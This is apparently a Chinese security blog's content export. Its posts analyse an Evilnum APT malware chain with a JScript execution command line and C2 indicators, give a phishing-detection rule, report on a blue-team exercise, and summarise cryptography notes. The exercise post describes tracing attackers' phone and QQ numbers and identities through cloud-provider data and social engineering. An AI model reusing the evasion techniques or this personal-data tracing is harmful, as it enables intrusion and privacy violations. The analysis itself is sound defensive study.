{"meta":{"title":"Mr.Guo","subtitle":"信息安全小白","description":"Myblog","author":"Mr.Guo","url":"https://github.com/gha01un/gha01un.github.io","root":"/"},"pages":[{"title":"","date":"2020-06-03T10:56:33.499Z","updated":"2020-06-03T10:56:33.499Z","comments":true,"path":"about/index.html","permalink":"https://github.com/gha01un/gha01un.github.io/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2020-12-07T14:02:17.000Z","updated":"2020-12-07T14:02:17.253Z","comments":true,"path":"archives/index.html","permalink":"https://github.com/gha01un/gha01un.github.io/archives/index.html","excerpt":"","text":""},{"title":"","date":"2020-06-03T10:56:13.910Z","updated":"2020-06-03T10:56:13.910Z","comments":false,"path":"categories/index.html","permalink":"https://github.com/gha01un/gha01un.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-06-03T10:55:14.290Z","updated":"2020-06-03T10:55:14.290Z","comments":false,"path":"tags/index.html","permalink":"https://github.com/gha01un/gha01un.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Evilnum  APT组织近期攻击行为总结","slug":"Evilnum 组织近期攻击行为的总结","date":"2022-10-14T07:09:39.778Z","updated":"2022-10-15T10:06:56.748Z","comments":true,"path":"2022/10/14/Evilnum 组织近期攻击行为的总结/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2022/10/14/Evilnum%20%E7%BB%84%E7%BB%87%E8%BF%91%E6%9C%9F%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E7%9A%84%E6%80%BB%E7%BB%93/","excerpt":"Evilnum APT组织近期攻击行为总结","text":"Evilnum APT组织近期攻击行为总结 组织介绍Evilnum 组织因使用 Evilnum 恶意软件而闻名，该组织最初于 2018 年被安全公司所披露。Evilnum 组织擅长对受害者目标使用鱼叉式网络钓鱼电子邮件，主要针对整个欧洲的金融科技公司。由于金融公司多数需要身份信息来验证注册，因而用于钓鱼邮件的附件通常使用扫描信用卡、水电费账单、身份证、驾驶执照和其他身份信息图片来作为诱饵内容。 Evilnum 专注于间谍活动，企图从目标单位企业获取财务信息，包括：客户列表和投资 及交易信息的文档、演示文稿、交易软件的凭证、浏览器数据、电子邮件登录信息、客户信用卡数据、甚至 VPN 配置等。自 2022 年初以来，Evilnum APT 组织的攻击行为一直在被各个国家密切监视。过程中发现他们针对英国和欧洲地区的国家发起的小规模针对性攻击活动的几个实例。近期的攻击行为使用最新的战术、技术和程序。在 2021 年观察到的早期活动中，该APT组织使用的主要分发媒介是 Windows 快捷方式文件 (LNK)或恶意文本文档 (ZIP) 作为电子邮件附件发送给受害者。在最近的例子中，攻击者已经开始使用 MS Office Word 文档，利用文档模板注入将恶意负载传送到受害者的机器上。 攻击手法 Evilnum APT 组织的主要目标集中在金融科技（金融服务）领域，特别是在英国和欧洲处理贸易和合规的公司。 2022 年 3 月，Evilnum APT 组的目标选择有重大更新。他们瞄准了一个处理国际移民服务的政府间组织。 袭击的时间线和选定目标的性质与俄乌的冲突相吻合。 攻击者以“通用数据保护条例 (GDPR)”为诱饵针对 KOT4X 单位进行鱼叉攻击，除此还有身份验证信息类型诱饵。 诱饵文档采用 LNK 加载 JS 代码的方法执行恶意代码，LNK 文件包含 JS 代码、PDF、 EXE 等数据，经过 JS 代码多层解密后执行最后的后门程序，整体分多个阶段执行，复杂程度较高。 载荷具备反调试、检测杀软的功能，多个阶段的载荷都有延迟代码，在获取最终阶段的载荷失败，则会等待 3 个小时后再次运行，这意味着该后门将隐蔽性放在第一原则。 模板注入阶段使用的是基于宏的文档利用 VBA 代码技术，企图绕过静态分析以防止逆向技术。 使用严重混淆的 JavaScript 解密并丢弃端点上的有效负载。JavaScript 配置了一个计划任务来运行已删除的二进制文件。与 EvilNum APT 组织使用的先前版本相比，此 JavaScript 在混淆技术方面有着显著改进。 在执行过程中创建的所有文件名称都是由攻击者仔细构造的，以欺骗合法的 Windows 平台和其他第三方二进制文件检测工具。 在每个新实例中，APT 组织使用与行业垂直目标相关的特定关键字注册多个域名。 样本分析第 1 阶段：恶意文档 主题的选取上延续了Evilnum在之前的行动中诱饵文件使用过的类似文件名，意为所有权证明。这些样本文档制作比较粗糙，包括本样本在内的一系列样本都是利用CVE-2017-0199来进行恶意行为执行，但内容却是诱导受害者打开Office宏的图。Evilnum在之前的行动中使用过这类诱导图片，不过本次未作修改就应用在这些样本中。 第 2 阶段：宏模板 [VBA 代码清除技术]模板包含主要的恶意宏代码。它利用了相当少见的 VBA 代码清除技术。这种技术会破坏源代码，并且仅将 VBA 宏代码（也称为 p 代码）的编译版本存储在文档中。因此，这种技术可以防止 olevba 等静态分析工具提取反编译的 VBA 代码。 使用沃尔玛团队提出的VBA Stomping — Advanced Maldoc Techniques技术，我们能够提取完整的宏代码。 宏代码中的所有字符串均使用如图所示的字符串解密函数进行解密。 以下是宏的主要功能。 1.文档文件有两个文本框，内容是加密的。这些文本框将在运行时由 VBA 宏代码解密。 a) 文本框 1 - msform_ct.TextBox1.Text。这将被解密并将内容写入%appdata%&quot;ThirdPartyNotices.txt” b) 文本框 2 - msform_ct.TextBox2.Text - 这将被解密并将内容写入“ %appdata%\\Redist.txt ” 2.将合法的 Windows 二进制Wscript.exe复制到名为“ msdcat.exe ”的文件中。此类文件复制操作是由恶意软件完成的，以此作为绕过端点安全产品的一种方式。 3.文件 - Redist.txt 包含将使用以下命令行执行的经过混淆的 JavaScript： msdcat.exe” /E:jscRipt “%appdata%\\Redist.txt” dg ThirdPartyNotices.txt\\ 注意： “dg”是存在于 VBA 宏代码中的硬编码命令行参数。 4. VBA宏代码执行过程中，多次调用doc.Shapes.AddPicture()从攻击者控制的服务器获取JPG图片。我们认为这是攻击者为了跟踪和记录端点上代码的执行而完成的。 图中显示了一个这样的示例。在命令行的构建和命令行的执行之间存在对 doc.Shapes.AddPicture() 的调用。 第 3 阶段：去混淆和分析我们将重点介绍一些在混淆的 JavaScript 中很少观察到的独特混淆技术。在执行时使用以下命令行向此 JavaScript 传递了两个参数： msdcat.exe” /E:jscRipt “C:\\Users\\user\\AppData\\Roaming\\Redist.txt” dg ThirdPartyNotices.txt 参数 1：“dg”，此字符串稍后用于 JavaScript 中的字符串解密函数。 参数 2：文件“thirdpartynotifications .txt”包含加密代码，将由JavaScript解密并删除文件系统上名为SerenadeDACplApp.exe的文件。 大多数混淆技术涉及大量加密和编码字符串，这些字符串在整个代码中使用索引进行引用。进行去混淆的常用方法需要多次“检索和替换”操作，其中将引用替换为实际解密和解码的字符串。 在这种情况下，JavaScript使用了一种有趣的技术，原始字符串数组被打乱，执行时在内存中也被打乱。因此，在不打乱数组的情况下解密引用字符串的任何尝试都将导致错误。这样的方法可以用来阻止逆向工程，也可以绕过一些试图自动化去混淆的工具。 下面的图中显示了在 JavaScript 开头定义的巨大字符串数组。这个数组被包裹在一个函数中，作为一个额外的混淆层。 下一步是解密混淆数组。下图中显示了相关的 JavaScript 代码，该代码使用粗略近似法来解密混淆数组。它有一个预定义的种子值“0x6467a”。在每次迭代中，该函数使用如下图所示的算法去计算一个种子，并将其与预定义的种子“0x6467a”进行比较，如果不满足条件，该函数继续将数组的内容向右移动一个位置，直到满足此条件。代码中包含相关注释以说明其逻辑。 用于混淆的其他技术包括控制流扁平化技术，下图显示了一种使用这种混淆技术的字符串解密函数。使用 switch-case 对解密步骤的顺序进行打乱，并遵循以下顺序： “15|12|3|2|14|5|1|10|9|17|8|7|6|4|13|16|0|11” 这意味着，最先执行“case 15”，然后执行“case 12”，依此类推。最后的“case 11”返回解密后的字符串。 第 4 阶段：丢弃二进制文件（加载程序）正如上节所述，JavaScript 删除了两个文件： a)一个可执行文件 (SerenadeDACplApp.exe) b)二进制文件 (devZUQVD.tmp) 上边的exe文件由计划任务连同所需的参数一起执行。在执行过程中，它执行以下操作： 1.执行命令行提取要加载的二进制文件 加载程序检查命令行是否以 ( “ ) 结尾。如果为真，则终止进程，否则将解析参数以提取要加载的二进制文件。 # 提取文件名有两种代码逻辑 如果第一个参数具有格式 ( –[char]=[char]* )，则加载程序将从该参数字符串中删除前 5 个字符，在其前面加上“dev”并附加“.tmp”。生成的字符串用作已删除二进制文件的文件名。 ​ 例子： ​ 参数字符串： –E=nThisIsUsedInFileName ​ 提取的文件名： devThisIsUsedInFileName.tmp 第二个参数字符串用作已删除二进制文件的文件名 2.使用Heaven’s gate技术调用NtOpenFile API创建文件句柄 3.使用 RtlAllocateHeap API 为读取文件内容分配内存 4.使用Heaven’s gate技术调用NtReadFile API读取文件内容到分配的内存 5.解密文件内容 # 加密内容格式 XOR 密钥长度（1 字节）+ XOR 密钥 + 加密内容大小（4 字节）+ 加密内容 解密后的内容原来是一个 PE 文件，它使用自定义格式来存储 PE 标头和节标头信息。 # 解密内容格式 自定义 PE 标题（+ 自定义部分标题 + 部分数据）*部分数量 #PE头格式 解密内容的开始以及 PE 标头（1 字节 - 00）+ 图像基础（4 字节）+ 图像大小（4 字节）+ 入口点（4 字节）+ 节数（4 字节）+ 到第一节的偏移量解密内容开头的信息（4 字节）+ 解密内容的大小（4 字节） # 节头格式 节号标记（1 字节）+ 节 RVA（4 字节）+ 节 VirtualSize（4 字节）+ 未知（4 字节） 7.使用Heaven’s gate技术调用NtAllocateVirtualMemory API 为要映射的PE文件分配内存。 注意：大小取自上述 PE 标头格式。 8.映射内存中的PE文件。 9.使用Heaven’s gate技术调用NtCreateThreadEx API 创建一个线程指向映射PE 的入口点。 注意：加载程序使用天堂之门技术来逃避端点安全产品以及系统调用或 API 监控应用程序。它使用自定义标头格式来阻止对 PE 标头或节标头模式的内存扫描，并且还难以将 PE 文件作为独立的可执行文件进行转储和分析。 第 5 阶段：映射 PE（后门）1.解密后门包括： a) C2 域名 b) 用户代理相关字符串 c) 网络路径 d) Referrer strings e) Cookies 2.解析从配置中检索到库的 API 地址 3.对生成的字符串进行加密和Base64编码 4.通过从配置中选择一种 cookie，将编码字符串嵌入 cookie 标头字段中。 [+] 网络通讯完成以上所有操作后。后门从配置中选择一个 C2 和一个路径，并发送网络请求。 如果请求成功，后门将向服务器查询可用内容并下载。 根据内容大小执行两种不同的操作： 1.如果内容大小为4，则后门检查下载的数据是否等于“01”。如果为真，它会获取机器快照并通过 POST 请求将其发送到 C2 服务器。快照数据以加密形式泄露，cookie 标头包含附加信息。 # cookie头字符串的格式 { “u”:”{first_arg-user_id}”, “sc”:1, “dt”=”{snapshot_date_time}” } 2.如果内容大小大于4，则后门将下载的数据解密并执行。 Indicators of compromise MD5 Description Filename 0b4f0ead0482582f7a98362dbf18c219 Document proof of ownership.docx 4406d7271b00328218723b0a89fb953b Document tradersway compliance.docx 61776b209b01d62565e148585fda1954 Document vantagemarkets documents.docx 6d329140fb53a3078666e17c249ce112 Document vantagefx compliance.docx db0866289dfded1174941880af94296f Document calliber docs (2).docx f0d3cff26b419aff4acfede637f6d3a2 Document complaince tfglobaltrading.docx 79157a3117b8d64571f60fe62c19bf17 Document complaint europatradecapital.com.docx 63090a9d67ce9534126cfa70716d735f Document fxtm_compliance.docx f5f9ba063e3fee25e0a298c0e108e2d4 Document livetraderfx.docx ea71fcc615025214b2893610cfab19e9 Loader SerenadeDACplApp.exe 51425c9bbb9ff872db45b2c1c3ca0854 Encrypted binary devZUQVD.tmp 3f230856172f211d5c9ed44ea783f850 zip Docs010621.zip 87288fd98126fd4f7f2003c1103c3f2d 04918bae6c83b6307b9c6c2018da6991 82aea1d24b6a13d37586e2d14d9a71f3 87288fd98126fd4f7f2003c1103c3f2d 9c0e353c53a41e94709e928fefde6071 IP 185.161.208[.]64 185.161.208[.]194 185.161.209[.]97 185.161.209[.]170 185.161.208[.]209 C2 Domains azure-ns[.]com microsft-ds[.]com afflaf[.]com quanatomedia[.]com webinfors[.]com khnga[.]com netwebsoc[.]com infcloudnet[.]com bgamifieder[.]com bunflun[.]com refinance-ltd[.]com book-advp[.]com mailservice-ns[.]com advertbart[.]com inetp-service[.]com yomangaw[.]com covdd[.]org visitaustriaislands[.]com traveladvnow[.]com tripadvit[.]com moreofestonia[.]com moretraveladv[.]com estoniaforall[.]com bookingitnow[.]org travelbooknow[.]org bookaustriavisit[.]com windnetap[.]com roblexmeet[.]com netrcmapi[.]com meetomoves[.]com bingapianalytics[.]com azuredcloud[.]com appdllsvc[.]com udporm[.]com pcamanalytics[.]com nortonalytics[.]com deltacldll[.]com mscloudin[.]com msdllopt[.]com zerobitfan[.]com edwardpof[.]com totaledgency[.]com mainsingular[.]com apidevops[.]org cloudreg-email[.]com mailservicenow[.]com namereslv[.]org apple-sdk[.]com dnstotal[.]org msftcrs[.]com sysconfwmi[.]com apiygate[.]com plancetron[.]com msftmnvm[.]com azurecfd[.]com msftprintsvc[.]com amazonpmnt[.]com cloudamazonft[.]com covidsrc[.]com covidsvcrc[.]com deuoffice[.]org alipayglobal[.]org worldsiclock[.]com printfiledn[.]com global-imsec[.]com amzncldn[.]com iteamates[.]com checkpoint-ds[.]com cloudhckpoint[.]com philipfin[.]com eroclasp[.]com azurecontents[.]com amznapis[.]com amazonappservice[.]com ammaze[.]org thismads[.]com mullticon[.]com amazoncontent[.]org tomandos[.]com wizdomofdo[.]com refsurface[.]com picodehub[.]com musthavethisapp[.]com dnserviceapp[.]com cloudazureservices[.]com anyfoodappz[.]com anypicsave[.]com cargoargs[.]com navyedu[.]org msftinfo[.]com invgov[.]org covidaff[.]org printauthors[.]com rombaic[.]com covsafezone[.]com amazoncld[.]com msftcd[.]com govtoffice[.]org covidgov[.]org questofma[.]com realshbe[.]com govdefi[.]com dogeofcoin[.]com borisjns[.]com travinfor[.]com Path /actions/async.php /admin/settings.php /admin/user/controller.php /admin/loginauth.php /administrator/index.php /cms/admin/login.php /backend/login/ajax_index.php /wp-admin/media-new.php /get.php /auth/login /admin/index.php /actions/authenticate.php /index.php /admin/login.php /wp-admin/admin-ajax.php","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"APT浅析","slug":"APT浅析","date":"2022-08-18T07:35:39.402Z","updated":"2022-08-18T09:07:50.556Z","comments":true,"path":"2022/08/18/APT浅析/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2022/08/18/APT%E6%B5%85%E6%9E%90/","excerpt":"APT浅析","text":"APT浅析 APT攻击定义及手法APT:高级持续威胁（Advanced Persistent Threat),普遍认可的定义是，利用各种先进的攻击手段，对高价值目标进行的有组织、长期持续性网络攻击行为。也就是说很难去确定是不是APT攻击，只能从已发生过的APT攻击事件，分析其特点，进而与上述解释性概念相关联，得出APT攻击的一般规律。 APT组织常用的攻击手法有：鱼叉式网络钓鱼、水坑攻击、路过式下载攻击、社会工程学、即时通讯工具、社交网络等，在各大分析报告中出现最多的还是鱼叉式网络钓鱼、水坑攻击、社会工程学。 鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧，只针对特定目标进行攻击的网络钓鱼攻击。当进行攻击的骇客锁定目标后，会以电子邮件的方式，假冒该公司或组织的名义寄发难以辨真伪之档案，诱使员工进一步登录其账号密码，使攻击者可以以此借机安装特洛伊木马或其他间谍软件，窃取机密；或于员工时常浏览之网页中置入病毒自动下载器，并持续更新受感染系统内之变种病毒，使使用者穷于应付。 水坑攻击（Watering hole）是一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等）。攻击者首先通过猜测或观察确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。 平台上APT事件的理解由今年的台账可以得出几类常见的APT事件类型： 1.某某公司的内网IP地址解析APT组织”毒云藤”等的钓鱼域名 2.某某公司的内网IP地址存在大量主要连接海莲花等APT团伙关联IP的通讯行为 3.某某公司IP地址主动外联APT组织C2地址 对现有已知的APT组织例如”海莲花””毒云藤”等的相关恶意域名以及恶意IP(IOC)进行收集，形成自己的体系，以便于我们更好的在平台上抓取到APT相关信息。 对于鱼叉式钓鱼防范的思考类似于报文规则，我们也可以适当的编写鱼叉式网络钓鱼的一些规则，通过对邮件协议的抓包，我们可以得到一些初步的结果。 当邮件的附件为exe且APT组织为毒云藤时，匹配如下： Date: 匹配任意字符 From: 匹配任意字符@qq.com或者匹配任意字符@163.com或者匹配任意字符@foxmail.com或者匹配任意字符@Outlook.com或者Gmail.com To: 匹配任意字符 Subject:包含 更新 或者 下载 或者 安装 或者 简历 或者 登入 或者 密码 或者 账户异常 或者 系统管理员 或者 通知 或者 告警 或者 订单 或者 采购单 或者 发票 或者 会议日程 或者 参会名单 或者 历届会议回顾 或者 密码重置 或者 验证 或者 整改 关键字： “201”，“202”，“2022年”，“报”，“报告”，“兵”，“部队”，“对台”，“工作”，“规划”，“国”，“国际”，“航”，“合作”，“机”，“机场”，“基地”，“极地”，“军”，“军事”，“科技”，“密”，“内部”，“十”，“十三”，“台”，“台湾”，“铁路”，“无人”，“项”，“雪”，“研”，“运输”，“战”，“站”，“中” Content-Type: application/octet-stream; name=”匹配任意字符.exe” 海莲花-APT32的简单分析“海莲花”，又名 APT32 和 OceanLotus，是越南背景的黑客组织。长期针对中国能源相关行业、海事机构、海域建设部门、科研院所和航运企业等进行网络攻击。APT32 至少自 2018 年开始积极使用 KerrDown 下载器，用于投递 Cobalt Strike Beacon 等后门，针对中国和越南语用户进行攻击。KerrDown 主要通过 MHT 格式的 DOC 文档，包含模板注入的 DOCX 文档，以及 ZIP 和 RAR 格式的压缩包进行投递。KerrDown 包含多层 Shellcode，多会针对包含 Microsoft、Google、Adobe、Neuber 等公司有效签名的EXE进行 DLL 劫持。 Microsoft Word 白利用的攻击示例(CPLH-NHNN-01-2019.rar):该样本释放的诱饵文档及内容翻译如下图所示。可以看出是以越南国家银行为诱饵，疑似针对越南国家银行相关的分支机构进行定向攻击。 Word 白利用是最常见的攻击手法，主要是因为 Word 可执行文件自带 Word 文档图标，可同时伪装成文档文件进行钓鱼攻击，因此备受青睐。而为了凸显伪装 Word 文档的真实性，木马执行后会释放并启动一个 Word 文档迷惑受害者。 以包含模板注入功能的 DOCX 文档为载体的攻击示例样本 CV-AnthonyWei-CustomerService.docx 的主要功能为加载 Word 远程模板，远程模板中带有的恶意宏代码会从该 DOCX 文件中提取并释放出两个 PE 文件，并将其主程序加入到计划任务中。当该服务启动后会从内存中加载一个内嵌的 SCLoader，从远程服务器下载 Shellcode 并执行。该样本主要执行流程如下: 该样本在微步云沙箱的分析结果如下图所示: 服务模块主要功能是内存加载一个名为 PostData.exe 的内嵌 EXE PostData.exe 通过命令行传入特定参数来下载并执行 Payload APT32 拥有丰富的，自定义的武器库，其中 KerrDown 为其至少自 2018 年开始积极使用的下载器，被用于投递 Cobalt Strike Beacon 等后门。KerrDown 相关攻击手法画像如下: 投递载体 DOC(MHT)，DOCX(TemplateInject)，ZIP，RAR 技术特点 多层 Shellcode，针对 Microsoft、Google、Adobe、Neuber 和 360 等的白加黑利用 投递 Payload Cobalt Strike Beacon 攻击目标 中国，越南语用户 海莲花白利用持久化新型组合攻击方式在日常狩猎海莲花攻击时，发现海莲花组织攻入企业内部后，滥用白利用技术，进行持久化驻留。配合横移技术以后，为了持久化驻留，使用了一个新的白利用驻留模式。 海莲花攻击步骤如下： ①攻陷企业内网管控端。 ②使用攻陷的内网管控端，通过SMB/RPC建立与目标内网终端的远程服务连接。 ③收集内网终端应用服务信息，同时收集其他可用于定制化的信息，例如：内网IP段，MAC地址，HostName等。 ④将定制化后门模块下发至目标内网终端的指定目录中。 ⑤将白文件下发替换内网终端的服务原可执行文件。 当内网终端原有任务计划启动服务时，相当于启动了白利用后门组合文件。根据对攻击过程的观察和分析，发现海莲花选择的目标服务主要是非系统服务，例如谷歌更新服务GoogleUpdate.exe，Adobe更新服务armsvc.exe。这些服务即使被替换也不会影响应用程序的正常使用。由于没有创建新服务项或修改原服务项的配置信息，仅替换原服务的可执行文件，用于替换的白文件也是可信文件，相当于模拟了一次应用程序文件升级的过程，以此来逃避安全软件的筛查。 新旧白利用方式横向对比以往海莲花在使用白利用手法攻击时，大多是通过远程服务或远程任务计划启动白利用组合文件。当内网终端被远程连接时，会留下相关痕迹。并且无法持久化控制白利用组合文件的启动。本次使用的新方式，利用了被攻击者系统中已存在的正常程序（服务）的任务计划来定时启动白文件加载后门模块，同时实现了持久化驻留的目的。避免了因远程服务连接而留下痕迹的缺点。","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"HVV工作总结","slug":"HVV工作总结","date":"2022-08-11T09:56:49.428Z","updated":"2022-08-12T07:42:40.346Z","comments":true,"path":"2022/08/11/HVV工作总结/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2022/08/11/HVV%E5%B7%A5%E4%BD%9C%E6%80%BB%E7%BB%93/","excerpt":"HVV工作总结","text":"HVV工作总结 一、准备工作在护网开始前的两周，收集整理现有各种OA产品漏洞、web应用漏洞、CMS漏洞的POC，以及常见的webshell攻击手段例如冰蝎、蚁剑、哥斯拉、shiro的攻击特征。验证并编写包含请求头，请求体，响应头，响应体以及返回状态码的报文规则两百余条，以便护网期间能让大家更好的在平台上检测到各种攻击的手法。当然我之前是从来没有接触过这些漏洞的，所以在工作中也遇到了很多困难，犯了很多错误。 二、护网情况我和带我的师傅两人在护网期间属于溯源分析组，主要任务是负责溯源红队的个人信息，撰写溯源报告，但也需要担任一些其他的工作。 1.报文规则的更新 在护网开始后，每天可能都会爆出各种0day，1day等等漏洞，我需要通过各种论坛，网站，博客，github上收集这些公开漏洞的POC，以及从hq那里得到的一些未公开漏洞的POC，然后整理更新报文规则，及时上传到我们的平台上。当有这种day攻击我们的企业时，我们便可以及时发现。在此期间，我也需要做漏洞验证的工作，有很多企业在平台上显示被注入了哥斯拉，冰蝎，蚁剑等，但是未必真正的注入成功，因此我需要拿这些webshell管理工具去连接这些URL，一旦连接成功，则表示企业被攻击成功，这样的话我便会告诉惠祁，他会与企业沟通然后做出一些具体措施。 2.样本分析 因为之前在学校做过一些逆向的题目，也参加过一些比赛，所以本次护网也参与一些样本分析的工作。我就拿一个普通的钓鱼样本举例，此样本主要用到的工具为PEID、StudyPE、IDA、x64dbg、火绒剑。首先我们要在沙箱中进行检测，看是否存在进程行为、网络行为等恶意行为，初步可以得到病毒启动是具有隐藏界面的，它隐藏在其他目录之中，并能修改网络代理且连接有多个域名等一系列操作。我们一定要在虚拟机中分析样本，这都是真毒，别把自己主机搞没了。运行样本之后，在火绒剑中捕捉样本行为动作，有设置注册表项，创建进程，文件增删改查，网络发包等操作。一般的样本都是用UPX或者VMP加过壳的，我们必须手动脱壳才能更好的进行下一步的分析。结合IDA和x64dbg的分析，可以更清楚的看到此样本会根据时间随机生成数作为文件名进行拼接，然后拷贝到我们的C盘目录下。在创建的线程中，通过分析可以判断为弱口令攻击，在IPC中内置了很多弱口令，根据此获取主机名以及网络连接的函数，通过弱口令感染局域网内其他主机。还有很多分析样本的具体细节就不在这里做过多解释，有时间的话我会分别把每个样本的分析过程都写出来的。总结一下就是分析得到样本中的具体逻辑行为以及敏感信息或者外联IP。虽然第一次分析钓鱼样本没有得到预期的效果，仅仅得到了一些CDN的IP，但是通过这此护网，也使我积累了很多分析的经验，希望下次能取得更好的成绩让自己满意。 3.溯源 这也是我第一次参加护网，所以可以说是零经验。在经过几天的摸索后，我们也渐渐的找到了一些正确的思路。首先根据我们前期在平台上录入的大量报文规则，可以每天大批量的导出IP，在筛除内网IP后，把剩余的IP放到微步中批量查询，再筛选出腾讯云，阿里云，百度云等有迹可循的恶意的红队IP。这里我们拿腾讯云IP举例，腾讯云的IP可以在腾讯云官网，通过抓包的方式得到注册此IP的人的QQ号前几位和后几位与手机号前几位与后几位的信息，然后通过各种whios查询，IP反查域名等网站查询注册域名的信息。这里有可能会查询到注册人的QQ邮箱，或者包含手机号的邮箱，看这些QQ号或者手机号是否与我们在腾讯云抓到的QQ号或手机号匹配，如果匹配那么即形成了闭环。在得到这些信息后，我们需要借助各种手法以及社工的方式找到其他信息，包括github地址，姓名，公司或者学校。这样便可以出一份溯源报告。 当然我们也可以通过扫描端口的方式，查看此红队IP是否开了一些不常见的端口。在这次护网中，就有一个IP开了8000端口，我们从此端口溯源到了这个人的具体信息。 溯源手法千变万化，没有统一的手法，在刚开始的几天试过很多错误的方法，但后来在摸清套路后，也渐渐走上正轨。在本次护网期间，我们一共出了6份溯源报告，也及时把这些红队信息以及攻击手段反馈给企业。 三、总结护网的机会是十分难得的，好在我没有浪费护网期间的每一天。在护网期间，每天都会面临新的挑战，学习新的东西。虽然十分辛苦，但还是特别充实的。期待在以后的工作中，不断进步，不断汲取新的知识，为下次护网打好基本功。","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"密码学复习总结","slug":"密码学复习","date":"2021-01-13T00:43:31.463Z","updated":"2021-01-25T03:50:57.069Z","comments":true,"path":"2021/01/13/密码学复习/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2021/01/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0/","excerpt":"图书馆学不进去就赶紧写个总结水篇博客吧！","text":"图书馆学不进去就赶紧写个总结水篇博客吧！ 第一章 密码学概述密码学：密码是按特定法则编成、用以对通信双方的信息进行明文-&gt;密文变换的符号。或者说，密码是隐蔽了真实内容的符号序列。 是结合数学、计算机科学、电子与通讯等诸多学科于一体的交叉学科，是研究信息系统安全保密的一门科学。 密码体制，也称密码系统(Cryptosystem)，由五部分组成：明文空间M，密文空间C，密钥空间K，加密算法E，解密算法D 。 第三章 古典密码仿射密码：选取𝑘1，𝑘2两个参数，其中gcd⁡(𝑘1, 26)＝1加密变换： 𝐶＝ 𝑘1∗𝑚＋𝑘2 𝑚𝑜𝑑 26解密变换： 𝑚＝ (𝐶−𝑘2)∗〖𝑘1〗^(−1) 𝑚𝑜𝑑 26 第四章 分组密码分组密码的设计要求： 分组长度要足够大:假设𝑛为分组长度，则要使2𝑛足够大，防止明文穷举攻击密钥量要足够大:防止密钥穷举攻击密码变换要足够复杂:使攻击者除穷举攻击外，找不到其他简洁的数学攻击方法加密和解密运算简单:便于软件和硬件的实现 无数据扩展和压缩 扩散原则（移位）：密钥或明文的每一比特变化影响密文的许多比特的变化，以便隐蔽明文的统计特性(形象的称为雪崩效应) 混淆原则（替代）：又称混乱原则，指密钥和明文以及密文之间的依赖关系尽可能的复杂化，以防通过统计分析法进行破译(如使用非线性变换) 乘积密码体制 Feistel网络的优点在于加解密相似性，它只需要一个逆转的密钥编排算法，其加解密部分几乎完全相同 SP网络是由多重S变换和P变换组合成的变换网络基本操作是S变换(代换)和P变换(置换)，前者称为S盒，后者称为P盒S盒起到混乱作用，P盒起到扩散的作用 DES轮函数F：扩展置换(E盒)，密钥加，非线性代换(S盒)，线性置换(P盒) 加密方程：L0R0 ←IP(&lt;64位明文&gt;)Ln←Rn-1Rn← Ln-1+(Rn-1,Kn)&lt;64位密文&gt;← IP-1(R16L16) 解密方程：R16L16 ←IP(&lt;64位密文&gt;)Rn-1←LnLn-1← Rn+(Ln,Kn)&lt;64位明文&gt;← IP-1(L0R0) S盒设计准则：具有良好的非线性(输出的每个比特与全部输入比特有关)每一行包括所有16种4位二进制两个输入相差1比特时，输出相差2比特如果两个输入刚好在中间两个比特上不同，则输出至少有两个比特不同如果两个输入前两位不同而最后两位相同，则输出一定不同相差6比特的输入共有32对，这32对中有不超过8对的输出相同 DES子密钥是从初始密钥(种子密钥)产生的种子密钥𝐾为64位，其中有8位用于奇偶校验，分别位于第8，16，24，32，40，48，56，64位奇偶校验位用于检查密钥𝐾在产生和分配以及存储过程中可能发生的错误DES的密钥实际上只有56位 DES的安全性：互补性：对明文𝑚逐位取补，记为𝑚 ̅，密钥𝐾逐位取补，记为𝑘 ̅ ， 若𝑐=𝐸𝑘(𝑚)，则有𝑐 ̅=𝐸𝑘 ̅ (𝑚 ̅) ，称为算法上的互补性由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后若对DES 的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补。弱密钥：给定初始密钥𝐾生成子密钥时，将种子密钥分成两个部分，如果𝐾使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝐾1=𝐾2=…=𝐾16，则称密钥𝐾为弱密钥（共有4个）若𝐾为弱密钥，则对任意的64比特信息有： 𝑬𝒌(𝑬𝒌(𝒎))= 𝒎 和 𝑫𝒌(𝑫𝒌(𝒎))= 𝒎半弱密钥：把明文加密成相同的密文，即存在两个不同的密钥𝑘和𝑘′,使得𝐸𝑘 (𝑚)=𝐸(𝑘^′ ) (𝑚)具有下述性质：若𝑘和𝑘′为一对弱密钥，𝑚为明文组，则有：𝐸(𝑘^′ ) (𝐸𝑘 (𝑚))=𝐸𝑘 (𝐸_(𝑘^′ ) (𝑚))=𝑚迭代轮数，密钥的长度 字节代换行移位列混合轮密钥加 乘 0x01 -&gt; 不变乘 0x02最高位为 0，直接左移一位 最高位为 1，左移一位后与0001 1011 异或乘 0x03，0000 0011= 0000 0010⊕0000 0001乘以 0x03 可以拆为分别称为 0x01 和 0x02，再将结果异或. 